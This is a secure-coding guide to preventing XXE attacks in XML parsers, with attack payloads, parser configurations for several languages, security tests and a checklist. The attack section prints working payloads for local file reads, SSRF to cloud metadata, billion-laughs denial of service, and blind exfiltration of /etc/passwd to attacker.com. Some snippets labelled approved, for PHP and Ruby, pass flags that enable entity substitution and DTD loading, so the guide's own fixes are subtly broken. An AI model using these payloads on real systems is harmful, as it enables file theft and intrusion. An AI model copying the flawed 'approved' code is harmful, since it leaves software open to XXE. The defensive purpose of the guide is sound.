# XML External Entity (XXE) Prevention

**OWASP Top 10 2021: A05 - Security Misconfiguration**  
**CWE-611: Improper Restriction of XML External Entity Reference**

## The Problem

XXE (XML External Entity) attacks exploit vulnerable XML parsers that process external entity references, allowing attackers to read local files, perform SSRF attacks, cause denial of service, or execute remote code.

**Attack Scenario:**

```xml
<!-- Attacker sends this XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- Server parses XML and returns local file content -->
<response>
  <name>
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ...
  </name>
</response>
```

## Why Critical

- **File Disclosure**: Read any file accessible to the application (config files, source code, /etc/passwd)
- **SSRF**: Scan internal network, access internal services
- **Denial of Service**: Billion laughs attack, recursive entity expansion
- **Remote Code Execution**: In rare cases with specific PHP configurations

**CVSS Score**: 8.6 (HIGH to CRITICAL)

---

## Attack Vectors

### 1. Local File Disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <customer>&xxe;</customer>
</order>

<!-- Read application secrets -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/app/.env">
]>

<!-- Read source code -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/app/config/database.yml">
]>
```

### 2. SSRF (Server-Side Request Forgery)

```xml
<!-- Access internal services -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>

<!-- Scan internal network -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/status">
]>

<!-- Access cloud metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

### 3. Denial of Service (Billion Laughs)

```xml
<!-- Exponential entity expansion -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<data>&lol9;</data>

<!-- Results in 3GB of "lol" strings, crashes parser -->
```

### 4. Blind XXE (Out-of-Band)

```xml
<!-- Exfiltrate data when direct output not visible -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

<!-- evil.dtd hosted on attacker.com -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

---

## Prevention Strategies (Defense in Depth)

### Strategy 1: Disable DTDs Entirely (PREFERRED)

**The safest approach is to disable Document Type Definitions (DTDs) completely:**

```python
# [APPROVED] Python with lxml
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,  # Disable entity resolution
    no_network=True,         # Disable network access
    dtd_validation=False,    # Disable DTD validation
    load_dtd=False           # Don't load external DTDs
)

xml_data = request.data
tree = etree.fromstring(xml_data, parser)
```

```javascript
// [APPROVED] Node.js with libxmljs2
const libxmljs = require('libxmljs2');

const xml = req.body;
const doc = libxmljs.parseXml(xml, {
  noent: false,    // Disable entity substitution
  nonet: true,     // Disable network access
  dtdload: false,  // Don't load DTDs
  dtdvalid: false  // Disable DTD validation
});
```

```java
// [APPROVED] Java with DocumentBuilderFactory
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable DTDs entirely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Extra protections
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xmlString)));
```

```php
// [APPROVED] PHP with libxml
libxml_disable_entity_loader(true);  // Disable external entities

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

---

### Strategy 2: Use Safe Parsing Libraries

**Modern libraries with XXE protection by default:**

```javascript
// [APPROVED] Node.js with xml2js (safe by default)
const xml2js = require('xml2js');

const parser = new xml2js.Parser({
  explicitArray: false,
  ignoreAttrs: false
  // External entities disabled by default
});

parser.parseString(xmlString, (err, result) => {
  if (err) {
    return res.status(400).json({ error: 'Invalid XML' });
  }
  res.json(result);
});
```

```python
# [APPROVED] Python with defusedxml (secure wrapper)
import defusedxml.ElementTree as ET

try:
    tree = ET.fromstring(xml_data)
except ET.ParseError:
    return {'error': 'Invalid XML'}
```

```csharp
// [APPROVED] C# with XmlTextReader
using System.Xml;

XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // Disable DTDs
settings.XmlResolver = null;                      // No external resources

using (XmlReader reader = XmlReader.Create(new StringReader(xmlString), settings))
{
    XmlDocument doc = new XmlDocument();
    doc.Load(reader);
}
```

---

### Strategy 3: Input Validation

**Reject XML with DOCTYPE declarations:**

```python
# [APPROVED] Pre-parsing validation
def validate_xml_no_dtd(xml_string):
    # Reject if contains DOCTYPE
    if '<!DOCTYPE' in xml_string.upper():
        raise ValueError('DOCTYPE declarations not allowed')
    
    # Reject if contains ENTITY
    if '<!ENTITY' in xml_string.upper():
        raise ValueError('ENTITY declarations not allowed')
    
    return xml_string

xml_data = validate_xml_no_dtd(request.data)
tree = ET.fromstring(xml_data)
```

```javascript
// [APPROVED] Pre-parsing validation
function validateXmlNoEntities(xmlString) {
  const upperXml = xmlString.toUpperCase();
  
  if (upperXml.includes('<!DOCTYPE')) {
    throw new Error('DOCTYPE declarations not allowed');
  }
  
  if (upperXml.includes('<!ENTITY')) {
    throw new Error('ENTITY declarations not allowed');
  }
  
  if (upperXml.includes('SYSTEM')) {
    throw new Error('SYSTEM keyword not allowed');
  }
  
  return xmlString;
}

const safeXml = validateXmlNoEntities(req.body);
```

---

### Strategy 4: Use JSON Instead of XML

**Avoid XML entirely when possible:**

```javascript
// [APPROVED] Use JSON instead of XML
app.post('/api/order', express.json(), (req, res) => {
  const order = req.body;  // JSON, no XXE risk
  
  // Process order
  res.json({ success: true });
});
```

---

## Secure Parser Configuration by Language

### Python

```python
# [APPROVED] lxml with safety features
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False,
    huge_tree=False  # Prevent billion laughs
)

# [APPROVED] Or use defusedxml
from defusedxml import ElementTree as ET
tree = ET.parse(xml_file)  # Safe by default
```

### Java

```java
// [APPROVED] JAXB with secure factory
JAXBContext jc = JAXBContext.newInstance(MyClass.class);
Unmarshaller unmarshaller = jc.createUnmarshaller();

// Disable XXE
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);

XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(xml));
MyClass obj = (MyClass) unmarshaller.unmarshal(xsr);
```

### .NET/C#

```csharp
// [APPROVED] Secure XmlDocument
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.XmlResolver = null;  // Disable external resolution

// [APPROVED] Secure XmlReader
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    xmlDoc.Load(reader);
}
```

### PHP

```php
// [APPROVED] Secure DOMDocument
libxml_disable_entity_loader(true);

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// [APPROVED] Or use SimpleXML
$xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NOENT);
```

### Ruby

```ruby
# [APPROVED] Nokogiri with safety features
require 'nokogiri'

doc = Nokogiri::XML(xml) do |config|
  config.nonet   # Disable network access
  config.noent   # Disable entity expansion
  config.dtdload # Don't load DTDs
end
```

---

## Vulnerable Patterns to Avoid

### ❌ REJECTED: Default XML parsers

```python
# VULNERABLE - Python xml.etree
import xml.etree.ElementTree as ET
tree = ET.parse('file.xml')  # Vulnerable to XXE
```

```java
// VULNERABLE - Java default DocumentBuilder
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(xmlFile);  // Vulnerable to XXE
```

```php
// VULNERABLE - PHP SimpleXML without protection
$xml = simplexml_load_string($xmlString);  // Vulnerable
```

---

## Testing for XXE Vulnerabilities

**Security test cases:**

```python
def test_xxe_file_disclosure():
    """Test that XXE file disclosure is blocked"""
    xxe_payload = '''<?xmlversion="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>'''
    
    response = client.post('/api/xml', data=xxe_payload)
    
    # Should reject or not return file content
    assert 'root:x:0:0' not in response.text
    assert response.status_code in [400, 500]

def test_xxe_billion_laughs():
    """Test that billion laughs attack is blocked"""
    billion_laughs = '''<!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    ]>
    <data>&lol2;</data>'''
    
    response = client.post('/api/xml', data=billion_laughs, timeout=5)
    
    assert response.status_code in [400, 500]

def test_xxe_ssrf():
    """Test that SSRF via XXE is blocked"""
    ssrf_payload = '''<?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    ]>
    <data>&xxe;</data>'''
    
    response = client.post('/api/xml', data=ssrf_payload)
    
    # Should not fetch external URLs
    assert 'ami-id' not in response.text
    assert response.status_code in [400, 500]
```

---

## Verification Checklist

- [ ] DTD processing disabled in XML parsers
- [ ] External entity resolution disabled
- [ ] Network access disabled for XML parsing
- [ ] Using secure XML libraries (defusedxml, libxmljs2 with noent)
- [ ] Input validation rejects DOCTYPE/ENTITY declarations
- [ ] Consider JSON instead of XML
- [ ] Automated tests for XXE payloads
- [ ] Entity expansion limits configured
- [ ] Code review checks for vulnerable XML parsing
- [ ] Security scanning tools enabled (e.g., SAST, dependency scanning)

---

## Real-World Examples

- **Google (2014)**: XXE in Google Toolbar allowed reading local files
- **Facebook (2014)**: XXE in docx/pptx file processing
- **PayPal (2016)**: XXE allowed SSRF to access internal systems

---

## References

- OWASP Top 10 2021: A05 - Security Misconfiguration
- CWE-611: Improper Restriction of XML External Entity Reference
- OWASP XXE Prevention Cheat Sheet
- NIST SP 800-53: SI-10 (Information Input Validation)
